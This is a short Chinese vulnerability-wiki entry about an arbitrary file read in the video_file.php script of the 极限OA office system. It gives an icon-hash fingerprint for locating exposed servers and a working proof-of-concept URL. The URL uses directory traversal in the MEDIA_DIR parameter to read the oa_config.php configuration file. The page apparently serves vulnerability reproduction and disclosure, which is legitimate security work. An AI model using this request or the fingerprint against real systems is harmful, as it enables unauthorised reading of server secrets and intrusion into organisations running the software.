---
title: "极限OA video_file.php 任意文件读取漏洞"
date: 2026-10-17 09:12:21
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "极限OA"
tags:
  - "极限OA"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

极限OA video_file.php存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感文件

## 漏洞影响

```
极限OA
```

## 网络测绘

```
icon_hash="1967132225"
```

## 漏洞复现

登录页面

![image-20220715111126095](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202207151111176.png)

验证POC

```
/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
```

![image-20220715111241562](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202207151112653.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%9E%81%E9%99%90OA-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
